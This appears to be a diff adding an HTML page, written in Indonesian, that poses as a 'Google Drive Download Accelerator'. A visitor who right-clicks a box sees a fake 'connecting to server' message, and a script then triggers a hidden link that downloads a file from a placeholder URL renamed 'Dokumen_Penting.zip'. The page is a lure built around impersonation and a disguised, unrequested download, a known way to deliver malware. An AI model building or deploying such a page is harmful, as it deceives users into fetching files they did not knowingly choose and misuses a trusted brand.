@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Google Drive Download Assistant</title>
+<style>
+    body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+    #status { color: red; font-weight: bold; margin-top: 20px; }
+    .instruction { 
+        padding: 20px; 
+        border: 2px dashed #4285F4; 
+        display: inline-block; 
+        cursor: pointer;
+    }
+</style>
+</head>
+<body>
+
+    <h2>Akselerator Unduhan Google Drive</h2>
+    <div id="link" class="instruction">
+        Klik Kanan di Sini dan Pilih "Open in New Window" untuk Memulai Unduhan Cepat
+    </div>
+    
+    <p id="status"></p>
+
+    <!-- Elemen unduhan tersembunyi -->
+    <a id="downloadTrigger" style="display:none;"></a>
+
+<script>
+  document.getElementById('link').addEventListener('contextmenu', function(event) {
+    const status = document.getElementById('status');
+    status.innerText = "Menghubungkan ke server... Mohon tunggu 4 detik.";
+
+    setTimeout(function() {
+        const dl = document.getElementById('downloadTrigger');
+        // Ganti URL di bawah dengan file target
+        dl.href = "https://example.com/file-asli.zip"; 
+        dl.download = "Dokumen_Penting.zip"; 
+        dl.click();
+        
+        status.innerText = "Unduhan dimulai!";
+    }, 4000);
+  });
+</script>
+
+</body>
+</html>
